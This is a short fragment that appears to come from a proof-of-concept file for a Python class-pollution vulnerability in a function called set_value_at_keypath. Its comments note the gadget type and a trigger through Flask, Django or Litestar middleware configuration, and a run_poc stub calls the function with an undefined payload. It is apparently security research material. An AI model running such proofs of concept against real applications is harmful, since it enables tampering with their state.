...
# Class Pollution Func: set_value_at_keypath
# Type: get-both-set-both
# Trigger: Local config/integration (Flask/Django/Litestar middleware)
...
def run_poc():
  set_value_at_keypath(target, PAYLOAD, payload_value)
